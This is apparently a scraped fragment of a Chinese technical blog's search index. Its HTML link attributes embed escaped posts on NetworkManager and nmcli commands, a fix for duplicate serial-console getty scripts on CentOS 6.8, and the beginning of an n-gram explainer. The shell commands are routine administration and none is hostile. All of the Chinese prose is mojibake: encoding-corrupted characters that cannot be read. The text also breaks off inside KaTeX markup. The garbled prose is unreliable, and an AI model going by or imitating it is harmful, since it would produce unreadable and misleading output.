&lt;p&gt;ç»“æœå’Œä¸Šé¢çš„ä¸€è‡´ã€‚&lt;/p&gt;
">linuxæ ‡å‡†è¾“å…¥/è¾“å‡º/é”™è¯¯åŠé‡å®šå‘</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/networkmanager-wang-luo-guan-li/"" data-c="
          &lt;p&gt;linuxå°†ç‰©ç†ç½‘ç»œè®¾å¤‡æŠ½è±¡ä¸ºinterfaceï¼Œå±è”½äº†ç‰©ç†ç½‘ç»œè®¾å¤‡çš„å¤šæ ·æ€§ï¼Œé€šè¿‡é©±åŠ¨ç¨‹åºæ£€æµ‹å›ºä»¶ä¿¡æ¯åœ¨linuxå†…æ ¸ä¸­ç™»è®°ï¼Œåœ¨æ•°æ®åŒ…æ”¶å‘æ—¶é€šè¿‡interfaceè¿›è¡Œäº¤äº’ã€‚ç½‘ç»œç®¡ç†å·¥å…·åŒ…æ‹¬networkæœåŠ¡ï¼ŒNetworkManageræœåŠ¡ï¼ŒipconfigæœåŠ¡ã€netstatæœåŠ¡ç­‰ã€‚åœ¨REHL8/centos8ä¸­å¼ƒç”¨äº†ä¹‹å‰ç‰ˆæœ¬ä¸­ç½‘ç»œç®¡ç†çš„networkæœåŠ¡ï¼Œä½¿ç”¨NetworkManageræœåŠ¡æ›¿ä»£ã€‚&lt;/p&gt;
&lt;p&gt;NetworkManagerä¸»è¦ç®¡ç†ä¸¤ç±»å¯¹è±¡ï¼šconnection(ç½‘å¡è¿æ¥é…ç½®)å’Œdevice(ç½‘å¡è®¾å¤‡)ï¼Œdeviceå¯¹åº”çš„æ˜¯interfaceï¼Œè€Œconnectionæ˜¯ä¾›è®¾å¤‡ä½¿ç”¨çš„é…ç½®ï¼ŒäºŒè€…æ˜¯å¤šå¯¹ä¸€çš„å…³ç³»ï¼Œä½†åŒæ—¶åªæœ‰ä¸€ä¸ªconnectionå¯¹è±¡ç”Ÿæ•ˆï¼Œå…¶ä¸­é…ç½®æ–‡ä»¶ä¾ç„¶é»˜è®¤å­˜æ”¾åœ¨&lt;code&gt;/etc/sysconfig/network-scripts/&lt;/code&gt;ä¸‹ï¼Œé…ç½®æ–¹å¼æœ‰ä¸¤ç§ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é€šè¿‡&lt;code&gt;nmcli connection add&lt;/code&gt;å‘½ä»¤é…ç½®ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼›&lt;/li&gt;
&lt;li&gt;æ‰‹åŠ¨é…ç½®ifcfgæ–‡ä»¶ï¼Œé€šè¿‡&lt;code&gt;nmcli connection reload&lt;/code&gt;æ¥ä½¿å…¶ç”Ÿæ•ˆï¼›&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;1-nmcliå‘½ä»¤å‚æ•°&#34;&gt;1 nmcliå‘½ä»¤å‚æ•°&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli --help
Usage: nmcli [OPTIONS] OBJECT { COMMAND | help }                              
OPTIONS
  -a, --ask                                ask for missing parameters         
  -c, --colors auto|yes|no                 whether to use colors in output    
  -e, --escape yes|no                      escape columns separators in values         
  -f, --fields &amp;lt;field,...&amp;gt;|all|common      specify fields to output           
  -g, --get-values &amp;lt;field,...&amp;gt;|all|common  shortcut for -m tabular -t -f      
  -h, --help                               print this help                    
  -m, --mode tabular|multiline             output mode                        
  -o, --overview                           overview mode                      
  -p, --pretty                             pretty output                      
  -s, --show-secrets                       allow displaying passwords         
  -t, --terse                              terse output                       
  -v, --version                            show program version               
  -w, --wait &amp;lt;seconds&amp;gt;                     set timeout waiting for finishing operations
                                                            
OBJECT 
  g[eneral]       NetworkManagers general status and operations              
  n[etworking]    overall networking control                                  
  r[adio]         NetworkManager radio switches                               
  c[onnection]    NetworkManagers connections                                
  d[evice]        devices managed by NetworkManager
  a[gent]         NetworkManager secret agent or polkit agent
  m[onitor]       monitor NetworkManager changes
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;2-åˆ›å»ºconnection&#34;&gt;2 åˆ›å»ºconnection&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;æŸ¥çœ‹å½“å‰ç½‘ç»œçŠ¶æ€&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli connection show
NAME         UUID                                  TYPE      DEVICE 
eth0  5fb06bd0-0bb0-7ffb-45f1-d6edd65f3e03  ethernet  eth0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¾“å‡ºæ¯ä¸€è¡Œå¯¹åº”ä¸€ä¸ªconnectionæ¡ç›®ã€‚&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;åˆ é™¤å½“å‰çš„connection&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli connection delete eth0
Connection &#39;eth0&#39; (5fb06bd0-0bb0-7ffb-45f1-d6edd65f3e03) successfully deleted.
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;æ–°å»ºä¸€ä¸ªconnectionï¼Œä½¿å…¶ç”Ÿæ•ˆ&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli connection add ifname eth0 con-name eth1 type ethernet
Connection &#39;eth1&#39; (7871698e-1a4e-41d0-80c5-24374ced9526) successfully added.
# nmcli connection show
NAME         UUID                                  TYPE      DEVICE 
eth1         e09fedfe-fe0a-4a30-b304-8bc662427e65  ethernet  --
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­¤æ—¶åœ¨&lt;code&gt;/etc/sysconfig/network-scripts/&lt;/code&gt;ä¸‹è‡ªåŠ¨ç”Ÿæˆäº†ä¸€ä¸ªifcfg-eth1çš„é…ç½®æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli connection up eth1
Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnec
tion/7)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;3-ä¿®æ”¹connection&#34;&gt;3 ä¿®æ”¹connection&lt;/h2&gt;
&lt;p&gt;ä¿®æ”¹ä¸€ä¸ªå·²ç»å­˜åœ¨connectionï¼Œç›´æ¥ç¼–è¾‘&lt;code&gt;/etc/sysconfig/network-scripts/&lt;/code&gt;ä¸‹å¯¹åº”çš„é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹å®Œåï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli connection reload
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ–è€…ç›´æ¥é€šè¿‡&lt;code&gt;nmcli connection modify&lt;/code&gt;å‘½ä»¤è¿›è¡Œä¿®æ”¹ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nmcli connection modify help
Usage: nmcli connection modify { ARGUMENTS | help }

ARGUMENTS := [id | uuid | path] &amp;lt;ID&amp;gt; ([+|-]&amp;lt;setting&amp;gt;.&amp;lt;property&amp;gt; &amp;lt;value&amp;gt;)+

Modify one or more properties of the connection profile.
The profile is identified by its name, UUID or D-Bus path. For multi-valued
properties you can use optional &#39;+&#39; or &#39;-&#39; prefix to the property name.
The &#39;+&#39; sign allows appending items instead of overwriting the whole value.
The &#39;-&#39; sign allows removing selected items instead of the whole value.

ARGUMENTS := remove &amp;lt;setting&amp;gt;

Remove a setting from the connection profile.

Examples:
nmcli con mod home-wifi wifi.ssid rakosnicek
nmcli con mod em1-1 ipv4.method manual ipv4.addr &amp;quot;192.168.1.2/24, 10.10.1.5/8&amp;quot;
nmcli con mod em1-1 +ipv4.dns 8.8.4.4
nmcli con mod em1-1 -ipv4.dns 1
nmcli con mod em1-1 -ipv6.addr &amp;quot;abbe::cafe/56&amp;quot;
nmcli con mod bond0 +bond.options mii=500
nmcli con mod bond0 -bond.options downdelay
nmcli con mod em1-1 remove sriov
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;4-ä¿®æ”¹deviceåç§°&#34;&gt;4 ä¿®æ”¹deviceåç§°&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# ip link set dev eth0 down
# ip link set dev eth0 name eth01
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶åå°†&lt;code&gt;/etc/sysconfig/network-scripts/&lt;/code&gt;ä¸‹çš„é…ç½®æ–‡ä»¶ä¸­çš„&lt;code&gt;device&lt;/code&gt;å­—æ®µä¹Ÿè¿›è¡Œæ›´æ–°ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# ip link set dev eth01 up 
# nmcli connection reload
&lt;/code&gt;&lt;/pre&gt;
">NetworkManager ç®¡ç†ç½‘å¡è®¾å¤‡</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/guan-yu-chuan-kou-console-deng-lu-shu-ru-shu-chu-shu-ju-za-rou-wen-ti-jie-jue/"" data-c="
          &lt;p&gt;è¿™ä¸¤å¤©åœ¨åˆ¶ä½œäº‘é•œåƒæ—¶ï¼Œä¹‹å‰çš„centos6.8æ—§ç‰ˆæœ¬é•œåƒå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼ŒåŸºäºvirsh consoleå‘½ä»¤ç™»å½•è™šæœºï¼Œä¼šå‡ºç°è¾“å…¥è¾“å‡ºæ•°æ®æ‚ç³…çš„é—®é¢˜ï¼Œå¯¼è‡´æ— æ³•ç™»å½•ã€‚&lt;/p&gt;
&lt;h2 id=&#34;1-é—®é¢˜å¤ç°&#34;&gt;1 é—®é¢˜å¤ç°&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# virsh console 1
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1683688865606.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;è¾“å…¥çš„ç”¨æˆ·åå¯†ç è¦ä¹ˆè¾“ä¸å…¨ï¼Œè¦ä¹ˆä¼šæ··åˆ°ä¸‹æ¬¡çš„è¾“å…¥è¡Œä¸­ã€‚&lt;/p&gt;
&lt;h2 id=&#34;2-é—®é¢˜åˆ†æ&#34;&gt;2 é—®é¢˜åˆ†æ&lt;/h2&gt;
&lt;p&gt;è¦æƒ³è§£å†³æ­¤é—®é¢˜ï¼Œé¦–å…ˆè¦äº†è§£ä¸€ä¸‹å¯ä»¥è¿æ¥linuxçš„è®¾å¤‡çš„ç±»å‹ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ä¸²å£ç»ˆç«¯&lt;/strong&gt;ï¼šä¸è®¡ç®—æœºçš„ä¸²è¡Œç«¯å£ç›¸è¿æ¥çš„ç»ˆç«¯è®¾å¤‡ï¼Œé€šå¸¸å°†ä¸²å£ç›¸è¿æ¥çš„è®¾å¤‡éƒ½æ˜¯å­—ç¬¦è®¾å¤‡ï¼Œä¸²å£æœ€å¤§çš„ç”¨é€”æ˜¯è¿æ¥ç»ˆç«¯ï¼Œä¸€æ¬¡å¸¸è¢«ç§°ä¸ºä¸²å£ç»ˆç«¯ï¼Œè¿™äº›è®¾å¤‡å¯¹åº”çš„æ–‡ä»¶ä½ç½®åœ¨&lt;code&gt;/dev/ttySn&lt;/code&gt;ï¼Œè®¾å¤‡å·é€šå¸¸ä¸º&lt;code&gt;ttyS0&lt;/code&gt;ã€&lt;code&gt;ttyS1&lt;/code&gt;ç­‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ä¼ªç»ˆç«¯&lt;/strong&gt;ï¼šä¼ªç»ˆç«¯æ˜¯æˆå¯¹çš„é€»è¾‘ç»ˆç«¯ï¼Œä¸€ä¸ªmasterç»ˆç«¯å’Œä¸€ä¸ªsalveç»ˆç«¯ï¼Œå…¶ä¸­slaveå¯¹åº”&lt;code&gt;/dev/pts/&lt;/code&gt;ä¸‹çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œmasteråˆ™åœ¨å†…å­˜ä¸­æ ‡è¯†ä¸ºä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚ä¼ªç»ˆç«¯ç”±ç»ˆç«¯æ¨¡æ‹Ÿå™¨æä¾›ï¼Œç»ˆç«¯æ¨¡æ‹Ÿå™¨æ˜¯è¿è¡Œåœ¨ç”¨æˆ·æ€çš„ä¸€ä¸ªåº”ç”¨ç¨‹åºã€‚&lt;code&gt;/dev/ptmx&lt;/code&gt;æ˜¯ç”¨äºåˆ›å»ºmasterå’Œslaveçš„æ–‡ä»¶ï¼Œå½“ä¸€ä¸ªè¿›ç¨‹æ‰“å¼€å®ƒæ—¶ï¼Œè·å¾—äº†ä¸€ä¸ªmasterçš„æ–‡ä»¶æè¿°ç¬¦ï¼ŒåŒæ—¶åœ¨&lt;code&gt;/dev/pts&lt;/code&gt;ä¸‹åˆ›å»ºä¸€ä¸ªslaveè®¾å¤‡æ–‡ä»¶ã€‚masterç«¯æ˜¯æ›´æ¥è¿‘ç”¨æˆ·æ˜¾ç¤ºå™¨ã€é”®ç›˜çš„ä¸€ç«¯ï¼Œslaveç«¯æ˜¯åœ¨è™šæ‹Ÿç»ˆç«¯ä¸Šè¿è¡Œçš„CLIï¼ˆCommand Line Interfaceï¼Œå‘½ä»¤è¡Œæ¥å£ï¼‰ç¨‹åºã€‚Linuxçš„ä¼ªç»ˆç«¯é©±åŠ¨ç¨‹åºï¼Œä¼šæŠŠâ€œmasterç«¯ï¼ˆå¦‚é”®ç›˜ï¼‰å†™å…¥çš„æ•°æ®â€è½¬å‘ç»™slaveç«¯ä¾›ç¨‹åºè¾“å…¥ï¼ŒæŠŠâ€œç¨‹åºå†™å…¥slaveç«¯çš„æ•°æ®â€è½¬å‘ç»™masterç«¯ä¾›ï¼ˆæ˜¾ç¤ºå™¨é©±åŠ¨ç­‰ï¼‰è¯»å–ã€‚&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1683702714124.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
sshå’Œtelnetåˆ™æ˜¯ä½¿ç”¨ä¼ªç»ˆç«¯å®ç°çš„ï¼Œè™šæ‹Ÿç»ˆç«¯çš„ä¸ªæ•°ä¸å—é™åˆ¶ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è™šæ‹Ÿç»ˆç«¯&lt;/strong&gt;ï¼šæ§åˆ¶å°ç»ˆç«¯é€šå¸¸æŒ‡ä¸è®¡ç®—ç›´æ¥ç›¸è¿çš„ç»ˆç«¯ï¼Œå¯ä»¥ç†è§£ä¸ºç‰©ç†ç»ˆç«¯ï¼Œä¾‹å¦‚vmwareæ‰“å¼€è™šæœºçš„æ“ä½œç»ˆç«¯ç•Œé¢ï¼ŒæŒ‰&lt;code&gt;alt+[F1~F6]&lt;/code&gt;æ›´æ¢æ§åˆ¶å°ç»ˆç«¯ï¼Œé»˜è®¤æƒ…å†µä¸‹å¯ä»¥åˆ‡æ¢tty1~tty6ã€‚&lt;code&gt;/dev/console&lt;/code&gt;å¯¹åº”äº†å½“å‰çš„ç„¦ç‚¹ç»ˆç«¯ï¼Œä¾‹å¦‚å½“å‰ä½¿ç”¨çš„æ˜¯tty3ï¼Œé‚£ä¹ˆ&lt;code&gt;/dev/console/&lt;/code&gt;åˆ™æŒ‡&lt;code&gt;/dev/tty3&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰&lt;strong&gt;æ§åˆ¶ç»ˆç«¯tty&lt;/strong&gt;ï¼Œæ§åˆ¶ç»ˆç«¯é€šå¸¸æ˜¯å¯¹äºå‰å°è¿›ç¨‹è€Œè¨€çš„ä¸€ä¸ªæ¦‚å¿µï¼Œæ¯ä¸€ä¸ªå‰å°è¿›ç¨‹æœ‰å¯¹åº”çš„æ§åˆ¶ç»ˆç«¯ï¼Œé‚£ä¹ˆ&lt;code&gt;/dev/tty&lt;/code&gt;å°±æ˜¯è¯¥è¿›ç¨‹çš„è®¾å¤‡æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡&lt;code&gt;ps -ax&lt;/code&gt;æŸ¥çœ‹è¿›ç¨‹ä¸å“ªä¸ªæ§åˆ¶ç»ˆç«¯ç›¸è¿ã€‚å¯¹äºå½“å‰ç™»å½•çš„shellè¿›ç¨‹è€Œè¨€ï¼Œ&lt;code&gt;/dev/tty&lt;/code&gt;å°±æ˜¯shellè¿›ç¨‹ä½¿ç”¨çš„ç»ˆç«¯ï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨&lt;code&gt;tty&lt;/code&gt;å‘½ä»¤æŸ¥çœ‹å…¶å…·ä½“å±äºçš„ç»ˆç«¯è®¾å¤‡ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;virsh console&lt;/code&gt;å‘½ä»¤æ˜¯å±äºä¸²å£ç»ˆç«¯ä¸€ç±»ï¼Œä¸²å£ç»ˆç«¯è¿›ç¨‹åœ¨å¯åŠ¨ä¹‹å‰ä¼šæ£€æŸ¥grubå¼•å¯¼å‚æ•°ï¼Œå¹¶å¯¹ç›¸å…³çš„é…ç½®æ–‡ä»¶è¿›è¡Œè¯»å–ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨centos6.8çš„é•œåƒçš„&lt;code&gt;/etc/grub.conf&lt;/code&gt;çš„kernelè¡Œé…ç½®çš„æœ€åä¸º&lt;code&gt;console=tty0 console=ttyS0,115200n8&lt;/code&gt;ï¼Œå…¶å«ä¹‰æ˜¯å°†kernelçš„å¯åŠ¨logè¾“å…¥åˆ°tty0å’ŒttyS0ï¼Œä¸”é…ç½®é åè€…çš„ä¼˜å…ˆçº§æ›´é«˜ï¼Œå³ttyS0ä½œä¸ºä¸»è¦consoleã€‚&lt;/p&gt;
&lt;p&gt;è€Œåœ¨&lt;code&gt;/etc/init/serial.conf&lt;/code&gt;æœ‰ä¸€æ®µè¯´æ˜ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# How this works:
#
# On boot, a udev helper examines /dev/console. If a serial console is the
# primary console (last console on the commandline in grub),  the event
# &#39;fedora.serial-console-available &amp;lt;port name&amp;gt; &amp;lt;speed&amp;gt;&#39; is emitted, which
# triggers this script. It waits for the runlevel to finish, ensures
# the proper port is in /etc/securetty, and starts the getty.
#
# If your serial console is not the primary console, or you want a getty
# on serial even if it&#39;s not the console, create your own event e.g.
# /etc/init/ttyS0.conf with content:
# # ttyS0 - agetty
# #
# # This service maintains a agetty on ttyS0.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ„æ€æ˜¯ä¸²å£ç»ˆç«¯å¦‚æœä¼˜å…ˆçº§è¾ƒé«˜çš„consoleé…ç½®åœ¨grubçš„commandlineä¸­ï¼Œåˆ™ä¼šæ‰§è¡Œæ­¤è„šæœ¬ã€‚æ­¤è„šæœ¬ä¸­çš„å‘½ä»¤ä¸ºï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;start on fedora.serial-console-available DEV=* and stopped rc RUNLEVEL=[2345]
stop on runlevel [S016]

instance $DEV
respawn
pre-start exec /sbin/securetty $DEV
exec /sbin/agetty /dev/$DEV $SPEED vt100-nav
post-stop exec /sbin/initctl emit --no-wait fedora.serial-console-available DEV=$DEV SPEED=$SPEED
usage &#39;DEV=ttySX SPEED=Y  - where X is console id and Y is baud rate&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è€Œåœ¨è¯¥é•œåƒä¸­çš„&lt;code&gt;/etc/init/&lt;/code&gt;ä¸‹è¿˜å­˜åœ¨ä¸€ä¸ª&lt;code&gt;ttyS0.conf&lt;/code&gt;è„šæœ¬æ–‡ä»¶ï¼Œè¯¥è„šæœ¬æ–‡ä»¶æ˜¯åœ¨è¿è¡Œä¸²å£ç»ˆç«¯ç¨‹åºä¹‹å‰æ‰§è¡Œï¼Œå…¶å‘½ä»¤ä¸ºï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;start on stopped rc RUNLEVEL=[2345]
stop on starting runlevel [016]
respawn
instance /dev/ttyS0
exec /sbin/agetty /dev/ttyS0 115200 vt100-nav
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘çŒœæ˜¯è¿™ä¸¤ä¸ªè„šæœ¬æ‰§è¡Œé‡å¤äº†ï¼Œç„¶åæˆ‘é‡‡ç”¨äº†å¦‚ä¸‹çš„è§£å†³æ–¹æ³•è¿›è¡ŒéªŒè¯ã€‚&lt;/p&gt;
&lt;h2 id=&#34;3-é—®é¢˜è§£å†³&#34;&gt;3 é—®é¢˜è§£å†³&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;åˆ é™¤&lt;code&gt;/etc/grub.conf&lt;/code&gt;commandlineè¡Œçš„&lt;code&gt;console=ttyS0,115200n8&lt;/code&gt;ï¼Œæˆ–è€…å°†å…¶ç½®äº&lt;code&gt;console=tty&lt;/code&gt;ä¹‹å‰ï¼Œè¿™æ ·&lt;code&gt;/etc/init/serial.conf&lt;/code&gt;ä¸ä¼šå¾—åˆ°æ‰§è¡Œï¼›&lt;/li&gt;
&lt;li&gt;åˆ é™¤&lt;code&gt;/etc/init/ttyS0.conf&lt;/code&gt;æ–‡ä»¶ï¼Œåªæ‰§è¡Œ&lt;code&gt;/etc/init/serial.conf&lt;/code&gt;æ–‡ä»¶ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;è¿™ä¸¤ç§æ–¹æ³•å‡å¯ä»¥è§£å†³æ­¤é—®é¢˜ï¼Œåæ¥ä¸ºäº†è¯æ˜ä¸æ˜¯å…¶ä»–åœ°æ–¹å‡ºç°çš„é—®é¢˜ï¼Œåˆåœ¨centoså®˜ç½‘ä¸‹è½½äº†6.8ç‰ˆæœ¬çš„é•œåƒè¿›è¡Œå¯¹æ¯”æµ‹è¯•ï¼Œæµ‹è¯•ç»“æœæ— å·®å¼‚ã€‚&lt;/p&gt;
">å…³äºä¸²å£consoleç™»å½•è¾“å…¥è¾“å‡ºæ•°æ®æ‚ç³…é—®é¢˜è§£å†³</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/n-gram/"" data-c="
          &lt;h2 id=&#34;n-gram&#34;&gt;n-gram&lt;/h2&gt;
&lt;h3 id=&#34;åŸºæœ¬åŸç†&#34;&gt;åŸºæœ¬åŸç†&lt;/h3&gt;
&lt;p&gt;N-gramæ˜¯ä¸€ç§ç®€å•çš„è¯­è¨€æ¨¡å‹ï¼Œåœ¨ä¸€äº›NLPä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åˆ¤æ–­ä¸€å¥è¯å‡ºç°çš„æ¦‚ç‡æ˜¯å¤šå°‘ï¼Œå³è¿™å¥è¯æ˜¯ä¸æ˜¯ç¬¦åˆäººçš„è¯´è¯ä¹ æƒ¯ï¼Œè¿™æ—¶å°±å¯ä»¥åˆ©ç”¨åˆ°N-gramã€‚ä¾‹å¦‚åœ¨æœç´¢å¼•æ“ä¸­è¾“å…¥ä¸€ä¸ªè¯è¯­ï¼Œä¸‹é¢ä¼šå‡ºç°å¤šä¸ªæ‰©å±•è¯æ¡ï¼Œè¿™ç§åŠŸèƒ½å…¶å®å°±å¯ä»¥é€šè¿‡N-gramå®ç°ã€‚&lt;/p&gt;
&lt;p&gt;N-gramçš„æ•°æ®æ¨¡å‹å¾ˆç®€å•ï¼Œå°±ä¸€æ¡æ•°å­¦è¡¨è¾¾å¼ï¼š&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ£&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ£&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ£&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;/msub&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;p(s) = p(w_1, w_2, ..., w_T) = p(w_1)p(w_2|w_1)p(w_3|w_1,w_2)...p(w_t|w_1,w_2,...,w_(T-1))
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span 